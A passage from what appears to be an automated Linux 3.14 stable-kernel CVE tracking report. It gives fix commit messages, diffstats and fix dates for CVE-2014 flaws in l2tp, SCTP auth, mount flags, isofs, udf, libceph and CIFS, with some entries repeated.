    for socket option levels != SOL_PPPOL2TP since day one, but that has
    never actually worked, since the l2tp socket isn't an inet socket.
    
    As David Miller points out:
    
      "If we wanted this to work, it'd have to look up the tunnel and then
       use tunnel->sk, but I wonder how useful that would be"
    
    Since this can never have worked so nobody could possibly have depended
    on that functionality, just remove the broken code and return -EINVAL.
    
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Acked-by: James Chapman <jchapman@katalix.com>
    Acked-by: David Miller <davem@davemloft.net>
    Cc: Phil Turnbull <phil.turnbull@oracle.com>
    Cc: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Willy Tarreau <w@1wt.eu>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 net/l2tp/l2tp_ppp.c |    4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-19
CVE: CVE-2014-4943
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-07-14
Linus Commit: 3cf521f7dc87c031617fd47e4b7aa2593c2f3daf
Linus Tag: 3.16
Stable Date: 2014-08-07
Stable Commit: 5a47f7ed643ef221a645da68031bfdfd36340aa1
Stable Tag: 3.14.16

CVE-2014-5045:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.15.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 295dc39d941dc2ae53d5c170365af4c9d5c16212
Author: Vasily Averin <vvs@parallels.com>
Date:   Mon Jul 21 12:30:23 2014 +0400

    fs: umount on symlink leaks mnt count
    
    Currently umount on symlink blocks following umount:
    
    /vz is separate mount
    
    # ls /vz/ -al | grep test
    drwxr-xr-x.  2 root root       4096 Jul 19 01:14 testdir
    lrwxrwxrwx.  1 root root         11 Jul 19 01:16 testlink -> /vz/testdir
    # umount -l /vz/testlink
    umount: /vz/testlink: not mounted (expected)
    
    # lsof /vz
    # umount /vz
    umount: /vz: device is busy. (unexpected)
    
    In this case mountpoint_last() gets an extra refcount on path->mnt
    
    Signed-off-by: Vasily Averin <vvs@openvz.org>
    Acked-by: Ian Kent <raven@themaw.net>
    Acked-by: Jeff Layton <jlayton@primarydata.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Christoph Hellwig <hch@lst.de>

 fs/namei.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-01
CVE: CVE-2014-5045
Break Date: 2013-09-03
Break Commit: 8033426e6bdb2690d302872ac1e1fadaec1a5581
Break Tag: 3.12
Linus Fix Date: 2014-07-24
Linus Commit: 295dc39d941dc2ae53d5c170365af4c9d5c16212
Linus Tag: 3.16
Stable Date: 2014-07-31
Stable Commit: 9b32e18d7ba2838991794893f10bf48805ef01ce
Stable Tag: 3.14.15

CVE-2014-5077:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.17.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 1be9a950c646c9092fb3618197f7b6bfb50e82aa
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Tue Jul 22 15:22:45 2014 +0200

    net: sctp: inherit auth_capable on INIT collisions
    
    Jason reported an oops caused by SCTP on his ARM machine with
    SCTP authentication enabled:
    
    Internal error: Oops: 17 [#1] ARM
    CPU: 0 PID: 104 Comm: sctp-test Not tainted 3.13.0-68744-g3632f30c9b20-dirty #1
    task: c6eefa40 ti: c6f52000 task.ti: c6f52000
    PC is at sctp_auth_calculate_hmac+0xc4/0x10c
    LR is at sg_init_table+0x20/0x38
    pc : [<c024bb80>]    lr : [<c00f32dc>]    psr: 40000013
    sp : c6f538e8  ip : 00000000  fp : c6f53924
    r10: c6f50d80  r9 : 00000000  r8 : 00010000
    r7 : 00000000  r6 : c7be4000  r5 : 00000000  r4 : c6f56254
    r3 : c00c8170  r2 : 00000001  r1 : 00000008  r0 : c6f1e660
    Flags: nZcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
    Control: 0005397f  Table: 06f28000  DAC: 00000015
    Process sctp-test (pid: 104, stack limit = 0xc6f521c0)
    Stack: (0xc6f538e8 to 0xc6f54000)
    [...]
    Backtrace:
    [<c024babc>] (sctp_auth_calculate_hmac+0x0/0x10c) from [<c0249af8>] (sctp_packet_transmit+0x33c/0x5c8)
    [<c02497bc>] (sctp_packet_transmit+0x0/0x5c8) from [<c023e96c>] (sctp_outq_flush+0x7fc/0x844)
    [<c023e170>] (sctp_outq_flush+0x0/0x844) from [<c023ef78>] (sctp_outq_uncork+0x24/0x28)
    [<c023ef54>] (sctp_outq_uncork+0x0/0x28) from [<c0234364>] (sctp_side_effects+0x1134/0x1220)
    [<c0233230>] (sctp_side_effects+0x0/0x1220) from [<c02330b0>] (sctp_do_sm+0xac/0xd4)
    [<c0233004>] (sctp_do_sm+0x0/0xd4) from [<c023675c>] (sctp_assoc_bh_rcv+0x118/0x160)
    [<c0236644>] (sctp_assoc_bh_rcv+0x0/0x160) from [<c023d5bc>] (sctp_inq_push+0x6c/0x74)
    [<c023d550>] (sctp_inq_push+0x0/0x74) from [<c024a6b0>] (sctp_rcv+0x7d8/0x888)
    
    While we already had various kind of bugs in that area
    ec0223ec48a9 ("net: sctp: fix sctp_sf_do_5_1D_ce to verify if
    we/peer is AUTH capable") and b14878ccb7fa ("net: sctp: cache
    auth_enable per endpoint"), this one is a bit of a different
    kind.
    
    Giving a bit more background on why SCTP authentication is
    needed can be found in RFC4895:
    
      SCTP uses 32-bit verification tags to protect itself against
      blind attackers. These values are not changed during the
      lifetime of an SCTP association.
    
      Looking at new SCTP extensions, there is the need to have a
      method of proving that an SCTP chunk(s) was really sent by
      the original peer that started the association and not by a
      malicious attacker.
    
    To cause this bug, we're triggering an INIT collision between
    peers; normal SCTP handshake where both sides intent to
    authenticate packets contains RANDOM; CHUNKS; HMAC-ALGO
    parameters that are being negotiated among peers:
    
      ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->
      <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------
      -------------------- COOKIE-ECHO -------------------->
      <-------------------- COOKIE-ACK ---------------------
    
    RFC4895 says that each endpoint therefore knows its own random
    number and the peer's random number *after* the association
    has been established. The local and peer's random number along
    with the shared key are then part of the secret used for
    calculating the HMAC in the AUTH chunk.
    
    Now, in our scenario, we have 2 threads with 1 non-blocking
    SEQ_PACKET socket each, setting up common shared SCTP_AUTH_KEY
    and SCTP_AUTH_ACTIVE_KEY properly, and each of them calling
    sctp_bindx(3), listen(2) and connect(2) against each other,
    thus the handshake looks similar to this, e.g.:
    
      ---------- INIT[RANDOM; CHUNKS; HMAC-ALGO] ---------->
      <------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] ---------
      <--------- INIT[RANDOM; CHUNKS; HMAC-ALGO] -----------
      -------- INIT-ACK[RANDOM; CHUNKS; HMAC-ALGO] -------->
      ...
    
    Since such collisions can also happen with verification tags,
    the RFC4895 for AUTH rather vaguely says under section 6.1:
    
      In case of INIT collision, the rules governing the handling
      of this Random Number follow the same pattern as those for
      the Verification Tag, as explained in Section 5.2.4 of
      RFC 2960 [5]. Therefore, each endpoint knows its own Random
      Number and the peer's Random Number after the association
      has been established.
    
    In RFC2960, section 5.2.4, we're eventually hitting Action B:
    
      B) In this case, both sides may be attempting to start an
         association at about the same time but the peer endpoint
         started its INIT after responding to the local endpoint's
         INIT. Thus it may have picked a new Verification Tag not
         being aware of the previous Tag it had sent this endpoint.
         The endpoint should stay in or enter the ESTABLISHED
         state but it MUST update its peer's Verification Tag from
         the State Cookie, stop any init or cookie timers that may
         running and send a COOKIE ACK.
    
    In other words, the handling of the Random parameter is the
    same as behavior for the Verification Tag as described in
    Action B of section 5.2.4.
    
    Looking at the code, we exactly hit the sctp_sf_do_dupcook_b()
    case which triggers an SCTP_CMD_UPDATE_ASSOC command to the
    side effect interpreter, and in fact it properly copies over
    peer_{random, hmacs, chunks} parameters from the newly created
    association to update the existing one.
    
    Also, the old asoc_shared_key is being released and based on
    the new params, sctp_auth_asoc_init_active_key() updated.
    However, the issue observed in this case is that the previous
    asoc->peer.auth_capable was 0, and has *not* been updated, so
    that instead of creating a new secret, we're doing an early
    return from the function sctp_auth_asoc_init_active_key()
    leaving asoc->asoc_shared_key as NULL. However, we now have to
    authenticate chunks from the updated chunk list (e.g. COOKIE-ACK).
    
    That in fact causes the server side when responding with ...
    
      <------------------ AUTH; COOKIE-ACK -----------------
    
    ... to trigger a NULL pointer dereference, since in
    sctp_packet_transmit(), it discovers that an AUTH chunk is
    being queued for xmit, and thus it calls sctp_auth_calculate_hmac().
    
    Since the asoc->active_key_id is still inherited from the
    endpoint, and the same as encoded into the chunk, it uses
    asoc->asoc_shared_key, which is still NULL, as an asoc_key
    and dereferences it in ...
    
      crypto_hash_setkey(desc.tfm, &asoc_key->data[0], asoc_key->len)
    
    ... causing an oops. All this happens because sctp_make_cookie_ack()
    called with the *new* association has the peer.auth_capable=1
    and therefore marks the chunk with auth=1 after checking
    sctp_auth_send_cid(), but it is *actually* sent later on over
    the then *updated* association's transport that didn't initialize
    its shared key due to peer.auth_capable=0. Since control chunks
    in that case are not sent by the temporary association which
    are scheduled for deletion, they are issued for xmit via
    SCTP_CMD_REPLY in the interpreter with the context of the
    *updated* association. peer.auth_capable was 0 in the updated
    association (which went from COOKIE_WAIT into ESTABLISHED state),
    since all previous processing that performed sctp_process_init()
    was being done on temporary associations, that we eventually
    throw away each time.
    
    The correct fix is to update to the new peer.auth_capable
    value as well in the collision case via sctp_assoc_update(),
    so that in case the collision migrated from 0 -> 1,
    sctp_auth_asoc_init_active_key() can properly recalculate
    the secret. This therefore fixes the observed server panic.
    
    Fixes: 730fc3d05cd4 ("[SCTP]: Implete SCTP-AUTH parameter processing")
    Reported-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Tested-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>
    Cc: Vlad Yasevich <vyasevich@gmail.com>
    Acked-by: Vlad Yasevich <vyasevich@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/associola.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-01
CVE: CVE-2014-5077
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-07-22
Linus Commit: 1be9a950c646c9092fb3618197f7b6bfb50e82aa
Linus Tag: 3.16
Stable Date: 2014-08-14
Stable Commit: 672fcd4d4631dc45c650cad3576f880c0907e2e3
Stable Tag: 3.14.17

CVE-2014-5206:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 07b645589dcda8b7a5249e096fece2a67556f0f4
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Mon Jul 28 17:10:56 2014 -0700

    mnt: Move the test for MNT_LOCK_READONLY from change_mount_flags into do_remount
    
    There are no races as locked mount flags are guaranteed to never change.
    
    Moving the test into do_remount makes it more visible, and ensures all
    filesystem remounts pass the MNT_LOCK_READONLY permission check.  This
    second case is not an issue today as filesystem remounts are guarded
    by capable(CAP_DAC_ADMIN) and thus will always fail in less privileged
    mount namespaces, but it could become an issue in the future.
    
    Cc: stable@vger.kernel.org
    Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c |   13 ++++++++++---
 1 file changed, 10 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-18
CVE: CVE-2014-5206
Break Date: 2012-11-19
Break Commit: 0c55cfc4166d9a0f38de779bd4d75a90afbe7734
Break Tag: 3.8
Linus Fix Date: 2014-07-31
Linus Commit: 07b645589dcda8b7a5249e096fece2a67556f0f4
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 9810174c0384f725a31be1dfc64a881695ad465d
Stable Tag: 3.14.19

CVE-2014-5206:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a6138db815df5ee542d848318e5dae681590fccd
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Mon Jul 28 16:26:53 2014 -0700

    mnt: Only change user settable mount flags in remount
    
    Kenton Varda <kenton@sandstorm.io> discovered that by remounting a
    read-only bind mount read-only in a user namespace the
    MNT_LOCK_READONLY bit would be cleared, allowing an unprivileged user
    to the remount a read-only mount read-write.
    
    Correct this by replacing the mask of mount flags to preserve
    with a mask of mount flags that may be changed, and preserve
    all others.   This ensures that any future bugs with this mask and
    remount will fail in an easy to detect way where new mount flags
    simply won't change.
    
    Cc: stable@vger.kernel.org
    Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c        |    2 +-
 include/linux/mount.h |    4 +++-
 2 files changed, 4 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-18
CVE: CVE-2014-5206
Break Date: 2012-11-19
Break Commit: 0c55cfc4166d9a0f38de779bd4d75a90afbe7734
Break Tag: 3.8
Linus Fix Date: 2014-07-31
Linus Commit: a6138db815df5ee542d848318e5dae681590fccd
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 98e68ce8f4a6d3ad72243eecd1022ba120b515d2
Stable Tag: 3.14.19

CVE-2014-5207:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9566d6742852c527bf5af38af5cbb878dad75705
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Mon Jul 28 17:26:07 2014 -0700

    mnt: Correct permission checks in do_remount
    
    While invesgiating the issue where in "mount --bind -oremount,ro ..."
    would result in later "mount --bind -oremount,rw" succeeding even if
    the mount started off locked I realized that there are several
    additional mount flags that should be locked and are not.
    
    In particular MNT_NOSUID, MNT_NODEV, MNT_NOEXEC, and the atime
    flags in addition to MNT_READONLY should all be locked.  These
    flags are all per superblock, can all be changed with MS_BIND,
    and should not be changable if set by a more privileged user.
    
    The following additions to the current logic are added in this patch.
    - nosuid may not be clearable by a less privileged user.
    - nodev  may not be clearable by a less privielged user.
    - noexec may not be clearable by a less privileged user.
    - atime flags may not be changeable by a less privileged user.
    
    The logic with atime is that always setting atime on access is a
    global policy and backup software and auditing software could break if
    atime bits are not updated (when they are configured to be updated),
    and serious performance degradation could result (DOS attack) if atime
    updates happen when they have been explicitly disabled.  Therefore an
    unprivileged user should not be able to mess with the atime bits set
    by a more privileged user.
    
    The additional restrictions are implemented with the addition of
    MNT_LOCK_NOSUID, MNT_LOCK_NODEV, MNT_LOCK_NOEXEC, and MNT_LOCK_ATIME
    mnt flags.
    
    Taken together these changes and the fixes for MNT_LOCK_READONLY
    should make it safe for an unprivileged user to create a user
    namespace and to call "mount --bind -o remount,... ..." without
    the danger of mount flags being changed maliciously.
    
    Cc: stable@vger.kernel.org
    Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c        |   36 +++++++++++++++++++++++++++++++++---
 include/linux/mount.h |    5 +++++
 2 files changed, 38 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-18
CVE: CVE-2014-5207
Break Date: 2012-11-19
Break Commit: 0c55cfc4166d9a0f38de779bd4d75a90afbe7734
Break Tag: 3.8
Linus Fix Date: 2014-07-31
Linus Commit: 9566d6742852c527bf5af38af5cbb878dad75705
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 92ecaf8784ebb728f2b147f5bfd9af5aa8a35f4e
Stable Tag: 3.14.19

CVE-2014-5207:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ffbc6f0ead47fa5a1dc9642b0331cb75c20a640e
Author: Eric W. Biederman <ebiederm@xmission.com>
Date:   Mon Jul 28 17:36:04 2014 -0700

    mnt: Change the default remount atime from relatime to the existing value
    
    Since March 2009 the kernel has treated the state that if no
    MS_..ATIME flags are passed then the kernel defaults to relatime.
    
    Defaulting to relatime instead of the existing atime state during a
    remount is silly, and causes problems in practice for people who don't
    specify any MS_...ATIME flags and to get the default filesystem atime
    setting.  Those users may encounter a permission error because the
    default atime setting does not work.
    
    A default that does not work and causes permission problems is
    ridiculous, so preserve the existing value to have a default
    atime setting that is always guaranteed to work.
    
    Using the default atime setting in this way is particularly
    interesting for applications built to run in restricted userspace
    environments without /proc mounted, as the existing atime mount
    options of a filesystem can not be read from /proc/mounts.
    
    In practice this fixes user space that uses the default atime
    setting on remount that are broken by the permission checks
    keeping less privileged users from changing more privileged users
    atime settings.
    
    Cc: stable@vger.kernel.org
    Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>
    Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

 fs/namespace.c |    8 ++++++++
 1 file changed, 8 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-18
CVE: CVE-2014-5207
Break Date: 2012-11-19
Break Commit: 0c55cfc4166d9a0f38de779bd4d75a90afbe7734
Break Tag: 3.8
Linus Fix Date: 2014-07-31
Linus Commit: ffbc6f0ead47fa5a1dc9642b0331cb75c20a640e
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 74006d6e96ec095bd518ba457c4b369d6ef549ba
Stable Tag: 3.14.19

CVE-2014-5471:
CVE-2014-5472:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 410dd3cf4c9b36f27ed4542ee18b1af5e68645a4
Author: Jan Kara <jack@suse.cz>
Date:   Sun Aug 17 11:49:57 2014 +0200

    isofs: Fix unbounded recursion when processing relocated directories
    
    We did not check relocated directory in any way when processing Rock
    Ridge 'CL' tag. Thus a corrupted isofs image can possibly have a CL
    entry pointing to another CL entry leading to possibly unbounded
    recursion in kernel code and thus stack overflow or deadlocks (if there
    is a loop created from CL entries).
    
    Fix the problem by not allowing CL entry to point to a directory entry
    with CL entry (such use makes no good sense anyway) and by checking
    whether CL entry doesn't point to itself.
    
    CC: stable@vger.kernel.org
    Reported-by: Chris Evans <cevans@google.com>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/isofs/inode.c |   15 ++++++++-------
 fs/isofs/isofs.h |   23 +++++++++++++++++++----
 fs/isofs/rock.c  |   39 ++++++++++++++++++++++++++++-----------
 3 files changed, 55 insertions(+), 22 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-31
CVE: CVE-2014-5471
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-08-19
Linus Commit: 410dd3cf4c9b36f27ed4542ee18b1af5e68645a4
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: 3ca762283e2af911674dea8c54631d2d45b04dbf
Stable Tag: 3.14.18

CVE-2014-5471:
CVE-2014-5472:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.18.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 410dd3cf4c9b36f27ed4542ee18b1af5e68645a4
Author: Jan Kara <jack@suse.cz>
Date:   Sun Aug 17 11:49:57 2014 +0200

    isofs: Fix unbounded recursion when processing relocated directories
    
    We did not check relocated directory in any way when processing Rock
    Ridge 'CL' tag. Thus a corrupted isofs image can possibly have a CL
    entry pointing to another CL entry leading to possibly unbounded
    recursion in kernel code and thus stack overflow or deadlocks (if there
    is a loop created from CL entries).
    
    Fix the problem by not allowing CL entry to point to a directory entry
    with CL entry (such use makes no good sense anyway) and by checking
    whether CL entry doesn't point to itself.
    
    CC: stable@vger.kernel.org
    Reported-by: Chris Evans <cevans@google.com>
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/isofs/inode.c |   15 ++++++++-------
 fs/isofs/isofs.h |   23 +++++++++++++++++++----
 fs/isofs/rock.c  |   39 ++++++++++++++++++++++++++++-----------
 3 files changed, 55 insertions(+), 22 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-08-31
CVE: CVE-2014-5471
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-08-19
Linus Commit: 410dd3cf4c9b36f27ed4542ee18b1af5e68645a4
Linus Tag: 3.17
Stable Date: 2014-09-05
Stable Commit: 3ca762283e2af911674dea8c54631d2d45b04dbf
Stable Tag: 3.14.18

CVE-2014-6410:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.21.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c03aa9f6e1f938618e6db2e23afef0574efeeb65
Author: Jan Kara <jack@suse.cz>
Date:   Thu Sep 4 14:06:55 2014 +0200

    udf: Avoid infinite loop when processing indirect ICBs
    
    We did not implement any bound on number of indirect ICBs we follow when
    loading inode. Thus corrupted medium could cause kernel to go into an
    infinite loop, possibly causing a stack overflow.
    
    Fix the possible stack overflow by removing recursion from
    __udf_read_inode() and limit number of indirect ICBs we follow to avoid
    infinite loops.
    
    Signed-off-by: Jan Kara <jack@suse.cz>

 fs/udf/inode.c |   35 +++++++++++++++++++++--------------
 1 file changed, 21 insertions(+), 14 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-6410
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-09-04
Linus Commit: c03aa9f6e1f938618e6db2e23afef0574efeeb65
Linus Tag: 3.17
Stable Date: 2014-10-09
Stable Commit: 82335226733fdf82ee3f231c08269a17fd62a3fc
Stable Tag: 3.14.21

CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c27a3e4d667fdcad3db7b104f75659478e0c68d8
Author: Ilya Dryomov <ilya.dryomov@inktank.com>
Date:   Tue Sep 9 19:39:15 2014 +0400

    libceph: do not hard code max auth ticket len
    
    We hard code cephx auth ticket buffer size to 256 bytes.  This isn't
    enough for any moderate setups and, in case tickets themselves are not
    encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but
    ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the
    buffer is allocated dynamically anyway, allocated it a bit later, at
    the point where we know how much is going to be needed.
    
    Fixes: http://tracker.ceph.com/issues/8979
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com>
    Reviewed-by: Sage Weil <sage@redhat.com>

 net/ceph/auth_x.c |   64 ++++++++++++++++++++++++-----------------------------
 1 file changed, 29 insertions(+), 35 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-6416
Break Date: 2010-02-11
Break Commit: ec0994e48ea2aebf62ff08376227f3a9ccf46262
Break Tag: 2.6
Linus Fix Date: 2014-09-10
Linus Commit: c27a3e4d667fdcad3db7b104f75659478e0c68d8
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 9956752afa398ea6e0c9c69b258be6afd73da4b1
Stable Tag: 3.14.19

CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c27a3e4d667fdcad3db7b104f75659478e0c68d8
Author: Ilya Dryomov <ilya.dryomov@inktank.com>
Date:   Tue Sep 9 19:39:15 2014 +0400

    libceph: do not hard code max auth ticket len
    
    We hard code cephx auth ticket buffer size to 256 bytes.  This isn't
    enough for any moderate setups and, in case tickets themselves are not
    encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but
    ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the
    buffer is allocated dynamically anyway, allocated it a bit later, at
    the point where we know how much is going to be needed.
    
    Fixes: http://tracker.ceph.com/issues/8979
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com>
    Reviewed-by: Sage Weil <sage@redhat.com>

 net/ceph/auth_x.c |   64 ++++++++++++++++++++++++-----------------------------
 1 file changed, 29 insertions(+), 35 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-6416
Break Date: 2010-02-11
Break Commit: ec0994e48ea2aebf62ff08376227f3a9ccf46262
Break Tag: 2.6
Linus Fix Date: 2014-09-10
Linus Commit: c27a3e4d667fdcad3db7b104f75659478e0c68d8
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 9956752afa398ea6e0c9c69b258be6afd73da4b1
Stable Tag: 3.14.19

CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit c27a3e4d667fdcad3db7b104f75659478e0c68d8
Author: Ilya Dryomov <ilya.dryomov@inktank.com>
Date:   Tue Sep 9 19:39:15 2014 +0400

    libceph: do not hard code max auth ticket len
    
    We hard code cephx auth ticket buffer size to 256 bytes.  This isn't
    enough for any moderate setups and, in case tickets themselves are not
    encrypted, leads to buffer overflows (ceph_x_decrypt() errors out, but
    ceph_decode_copy() doesn't - it's just a memcpy() wrapper).  Since the
    buffer is allocated dynamically anyway, allocated it a bit later, at
    the point where we know how much is going to be needed.
    
    Fixes: http://tracker.ceph.com/issues/8979
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Ilya Dryomov <ilya.dryomov@inktank.com>
    Reviewed-by: Sage Weil <sage@redhat.com>

 net/ceph/auth_x.c |   64 ++++++++++++++++++++++++-----------------------------
 1 file changed, 29 insertions(+), 35 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-6416
Break Date: 2010-02-11
Break Commit: ec0994e48ea2aebf62ff08376227f3a9ccf46262
Break Tag: 2.6
Linus Fix Date: 2014-09-10
Linus Commit: c27a3e4d667fdcad3db7b104f75659478e0c68d8
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 9956752afa398ea6e0c9c69b258be6afd73da4b1
Stable Tag: 3.14.19

CVE-2014-7145:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.19.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 18f39e7be0121317550d03e267e3ebd4dbfbb3ce
Author: Steve French <smfrench@gmail.com>
Date:   Sun Aug 17 00:22:24 2014 -0500

    [CIFS] Possible null ptr deref in SMB2_tcon
    
    As Raphael Geissert pointed out, tcon_error_exit can dereference tcon
    and there is one path in which tcon can be null.
    
    Signed-off-by: Steve French <smfrench@gmail.com>
    CC: Stable <stable@vger.kernel.org> # v3.7+
    Reported-by: Raphael Geissert <geissert@debian.org>

 fs/cifs/smb2pdu.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-7145
Break Date: 2012-07-24
Break Commit: faaf946a7d5b79194358437150f34ab4c66bfe21
Break Tag: 3.6
Linus Fix Date: 2014-08-17
Linus Commit: 18f39e7be0121317550d03e267e3ebd4dbfbb3ce
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: e6fc2f0c1df49edd76d34517133fab7fb93cd5cc
Stable Tag: 3.14.19

CVE-2014-7283:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.2.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
